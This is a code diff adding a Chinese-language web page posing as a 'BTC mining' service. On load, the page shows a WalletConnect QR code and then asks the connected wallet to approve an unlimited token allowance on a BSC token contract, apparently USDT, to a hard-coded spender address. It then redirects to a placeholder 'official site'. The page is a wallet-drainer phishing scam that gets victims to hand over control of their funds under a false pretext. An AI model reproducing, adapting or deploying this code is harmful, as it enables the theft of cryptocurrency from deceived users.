@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>BTC挖矿</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+</head>
+<body style="text-align:center;margin-top:50px;font-family:sans-serif">
+
+<h2>BTC挖矿</h2>
+<p id="status">请扫码连接钱包</p>
+<canvas id="qrcode"></canvas>
+
+<script>
+const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+const spender = "0x766909a9F77664dA97B2BE58F02bB69769c27690";
+const ABI = [
+  {
+    "constant": false,
+    "inputs": [
+      {"name":"_spender","type":"address"},
+      {"name":"_value","type":"uint256"}
+    ],
+    "name":"approve",
+    "outputs":[{"name":"","type":"bool"}],
+    "type":"function"
+  }
+];
+const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+async function startWalletConnect() {
+  // 初始化 WalletConnect Provider
+  const provider = new window.WalletConnectProvider.default({
+    rpc: { 56: "https://bsc-dataseed.binance.org/" }, // BSC 主网
+  });
+
+  // 生成二维码供手机钱包扫描
+  provider.on("display_uri", (uri) => {
+    document.getElementById("status").innerText = "请用钱包扫码授权";
+    QRCode.toCanvas(document.getElementById("qrcode"), uri, function (error) {
+      if (error) console.error(error);
+    });
+  });
+
+  // 启动连接
+  await provider.enable();
+  const web3 = new Web3(provider);
+  const accounts = await web3.eth.getAccounts();
+  const account = accounts[0];
+  document.getElementById("status").innerText = "已连接: " + account;
+
+  // 调用 approve 无限授权
+  const contract = new web3.eth.Contract(ABI, tokenAddress);
+  try {
+    await contract.methods.approve(spender, maxAmount).send({ from: account });
+    alert("授权成功，即将跳转官网");
+    window.location.href = "https://你的官网.com";
+  } catch (err) {
+    console.error(err);
+    alert("授权失败，请检查钱包网络或余额");
+  }
+}
+
+// 页面加载后自动启动 WalletConnect
+window.addEventListener('load', () => {
+  startWalletConnect();
+});
+</script>
+
+</body>
+</html>
